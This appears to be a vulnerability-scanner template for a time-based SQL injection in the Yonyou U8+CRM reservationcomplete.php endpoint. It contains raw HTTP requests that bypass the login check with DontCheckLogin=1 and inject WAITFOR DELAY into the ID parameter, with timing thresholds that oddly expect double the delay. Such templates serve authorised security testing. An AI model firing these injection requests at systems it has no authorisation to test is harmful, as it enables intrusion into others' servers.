id: poc-yaml-yongyou-crm-reservationcomplete-sqli
info:
  name: 用友U8+CRM接口reservationcomplete.php ID参数存在SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    用友U8+CRM接口reservationcomplete.php中ID参数存在SQL注入漏洞，利用该漏洞可以通过延时注入的方式验证。

variables:
  t1: "{{rand_int(3, 5)}}"
  t2: "{{to_number(t1) * 2}}"
  t3: "{{to_number(t2) + 2}}"
  t4: "{{rand_int(1, 3)}}"
  t5: "{{to_number(t4) * 2}}"
  t6: "{{to_number(t5) + 2}}"

http:
  - raw:
      - |
        GET /bgt/reservationcomplete.php?DontCheckLogin=1&ID=-1;WAITFOR+DELAY+'0:0:{{t1}}'--+ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - duration >= {{t2}}
          - duration <= {{t3}}
      - type: word
        words:
          - ""
        part: body

  - raw:
      - |
        GET /bgt/reservationcomplete.php?DontCheckLogin=1&ID=-1;WAITFOR+DELAY+'0:0:{{t4}}'--+ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - duration >= {{t5}}
          - duration <= {{t6}}
      - type: word
        words:
          - ""
        part: body
